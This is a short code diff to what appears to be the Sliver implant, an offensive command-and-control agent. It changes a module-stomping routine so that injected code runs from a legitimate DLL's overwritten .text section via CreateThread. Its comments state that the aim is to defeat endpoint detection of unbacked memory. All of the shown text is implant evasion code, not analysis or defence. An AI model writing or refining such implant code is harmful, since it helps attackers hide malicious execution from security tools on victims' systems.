@@ -50,6 +50,7 @@ import (
 	"log"
 	//{{end}}
 
+	"github.com/bishopfox/sliver/implant/sliver/syscalls"
 	"golang.org/x/sys/windows"
 )
 
@@ -213,11 +214,16 @@ func stompIntoModule(data []byte, dllPath string, base uintptr) (*StompResult, e
 		return nil, fmt.Errorf("NtProtectVirtualMemory(RX restore): %w", err)
 	}
 
-	// 6. Execute from the file-backed region (gadget-dispatched NtCreateThread,
-	// current process). Caller owns the thread handle.
-	thread, err := NtCreateThreadRemote(windows.Handle(curProc), textBase)
+	// 6. Execute from the file-backed region — kernel32 CreateThread (local).
+	// NtCreateThread takes 8 args on modern x64 and the Syscall6 dispatcher
+	// caps at 6 (see NTInjectTask note); kernel32 leaves a clean stack and
+	// the thread start address (file-backed .text) is what defeats
+	// unbacked-memory provenance, not the creation API itself.
+	var lpThreadId uint32
+	thread, err := syscalls.CreateThread(
+		nil, 0, textBase, uintptr(0), 0, &lpThreadId)
 	if err != nil {
-		return nil, fmt.Errorf("NtCreateThread in stomped region: %w", err)
+		return nil, fmt.Errorf("CreateThread in stomped region: %w", err)
 	}
 
 	//{{if .Config.Debug}}
